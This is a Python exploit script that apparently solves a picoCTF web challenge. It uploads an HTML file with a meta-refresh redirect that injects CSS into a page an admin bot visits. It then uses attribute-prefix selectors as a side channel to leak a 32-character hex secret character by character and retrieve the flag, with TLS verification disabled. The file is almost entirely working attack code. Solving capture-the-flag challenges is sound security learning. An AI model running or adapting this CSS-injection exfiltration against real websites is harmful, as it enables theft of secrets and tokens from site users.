import requests
import time
import urllib.parse
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://lonely-island.picoctf.net:63538"

session = requests.Session()
session.verify = False

HEX = "0123456789abcdef"

def upload(selector):
    css = f"<style>body{selector}{{background-image:url('/flag?secret=probe')}}</style>"
    html = f'<meta http-equiv="refresh" content="0;url=/secret?payload={urllib.parse.quote(css)}">'
    
    files = {
        "file": ("x.html", html, "text/html")
    }

    r = session.post(BASE + "/upload", files=files, allow_redirects=False)

    print("[DEBUG] upload status:", r.status_code)
    print("[DEBUG] headers:", dict(r.headers))

    loc = r.headers.get("Location")
    if not loc:
        print("[DEBUG] upload response body:")
        print(r.text)
        raise Exception("No Location header returned from /upload")

    m = re.search(r"/paper/(\d+)", loc)
    if not m:
        raise Exception(f"Could not parse paper id from Location: {loc}")

    return m.group(1)


def trigger(paper_id):
    while True:
        r = session.get(BASE + "/visit/" + paper_id)
        txt = r.text.lower()

        print("[DEBUG] /visit response:", txt.strip())

        if "visiting" in txt:
            return

        time.sleep(2)


def probe(prefix):
    pid = upload(f'[secret^="{prefix}"]')
    print("[+] Uploaded paper id:", pid)

    trigger(pid)

    time.sleep(4)

    r = session.get(BASE + "/flag?secret=test")
    txt = r.text.lower().strip()
    print("[DEBUG] probe response:", txt)

    return "nice try" in txt


secret = ""

while len(secret) < 32:
    found = False

    for c in HEX:
        test = secret + c
        print(f"[*] Trying prefix: {test}")

        if probe(test):
            secret += c
            print("[+] Secret so far:", secret)
            found = True
            break

    if not found:
        print("[-] No matching character found. Instance may have reset or timing may be off.")
        break

print("[+] SECRET =", secret)

if len(secret) == 32:
    r = session.get(BASE + "/flag?secret=" + secret)
    print("[+] Final response:")
    print(r.text)
